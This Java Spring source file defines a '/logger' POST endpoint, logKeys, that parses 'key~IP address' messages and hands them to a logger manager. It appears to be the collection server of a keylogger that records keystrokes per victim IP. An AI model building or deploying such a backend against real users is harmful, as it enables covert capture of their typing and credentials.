package org.whatever.library.controller;

import javafx.util.Pair;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;
import org.whatever.library.logger.LoggerManager;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

@RestController
public class LoggerController {

    private LoggerManager loggerManager = new LoggerManager();

    @PostMapping("/logger")
    public void logKeys(@RequestBody String message) {
        Pair<String, String> information = extractInformation(message);

        if (information != null)
            loggerManager.consumeMessage(information.getKey(), information.getValue());
    }

    private Pair<String, String> extractInformation(String message) {
        String regex = "\\\"([a-zA-Z0-9.]+)\\~([0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)\\\"";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(message);

        if (!matcher.matches()) {
            regex = "\\\"\\'([a-zA-Z0-9.]+)\\'\\~([0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+)\\\"";
            pattern = Pattern.compile(regex);
            matcher = pattern.matcher(message);
        }
        if (matcher.matches())
            return new Pair<>(matcher.group(1), matcher.group(2));

        return null;
    }

}
